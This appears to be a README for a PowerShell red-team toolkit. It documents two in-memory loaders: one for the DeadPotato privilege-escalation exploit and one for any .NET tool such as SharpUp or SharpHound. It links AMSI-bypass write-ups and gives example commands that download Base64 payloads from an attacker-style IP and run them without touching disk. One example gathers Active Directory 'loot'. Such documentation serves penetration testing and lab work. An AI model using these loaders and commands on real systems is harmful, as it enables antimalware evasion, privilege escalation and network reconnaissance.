### Inspiration and code that has been incorporated into these scripts

- https://thalpius.com/2021/10/14/microsoft-windows-antimalware-scan-interface-bypasses/
- https://www.rewterz.com/blog/how-i-bypassed-amsi-statically-using-windbg
- https://rxored.github.io/post/csharploader/bypassing-amsi-with-csharp/#amsiscanbuffer
- https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b


- **Invoke-InMemoryDotNet** – A generalized loader for any .NET assembly with a static `Main(string[] args)` method.
- **Invoke-DeadPotato** – A specific loader for the DeadPotato exploit

## Invoke-DeadPotato

`Invoke-DeadPotato` is a specialized PowerShell loader designed to execute the **DeadPotato** .NET exploit (or any similarly structured binary) directly from memory. It supports embedded or remotely hosted gzipped+Base64 payloads.

### Features

- Loads DeadPotato (or similar tool) from Base64+gzipped payload
- Executes in-memory without touching disk
- Allows command-line arguments (e.g., `-cmd whoami`)
- Captures console output and returns result

### Parameters

| Parameter    | Description                                      |
|-------------|--------------------------------------------------|
| `-Arguments` | Command-line string to pass to DeadPotato        |
| `-UseRemote` | Optional URL to load gzipped+Base64 binary       |

### Examples

#### Run embedded DeadPotato
```powershell
Invoke-DeadPotato -Arguments "-cmd whoami"
```

#### Download and execute
```powershell
Invoke-DeadPotato -UseRemote "http://10.10.14.31/dp.gz.b64" -Arguments "-cmd whoami"
```

### Notes

- The class name must be `DeadPotato.Program` with a public static `Main` method.
- You must insert a valid gzipped Base64-encoded payload into the `$b64` variable or provide a URL to it.
- Output is captured and returned as a string.


## Invoke-InMemoryDotNet (not extensively tested yet)

`Invoke-InMemoryDotNet` is a PowerShell loader that dynamically executes any .NET assembly in memory. It supports embedded payloads or remote retrieval via URL. The assembly must expose a public static `Main(string[] args)` method.

### Features

- Executes gzipped + Base64-encoded .NET assemblies entirely in memory
- Supports embedded payload or remote download via HTTP/S
- Captures and returns all `Console.WriteLine` output
- Generic support for any .NET tool with a `Main` entry point (e.g., SharpUp, SharpHound, Seatbelt)

### Parameters

| Parameter    | Description                                       |
|-------------|---------------------------------------------------|
| `-Arguments` | String of arguments to pass to the Main method    |
| `-UseRemote` | URL pointing to a gzipped+Base64-encoded payload  |
| `-TypeName`  | Optional: class name containing the Main method   |
| `-MethodName`| Optional: method to invoke (default: `Main`)      |

### Examples

#### Run embedded payload
```powershell
Invoke-InMemoryDotNet -Arguments "-f all"
```

#### Download SharpUp and run
```powershell
Invoke-InMemoryDotNet -UseRemote "http://10.10.14.31/SharpUp.gz.b64" -Arguments "-f all"
```

#### Execute SharpHound collector
```powershell
Invoke-InMemoryDotNet -UseRemote "http://10.10.14.31/SharpHound.gz.b64" -Arguments "--CollectionMethod All --ZipFileName loot.zip"
```
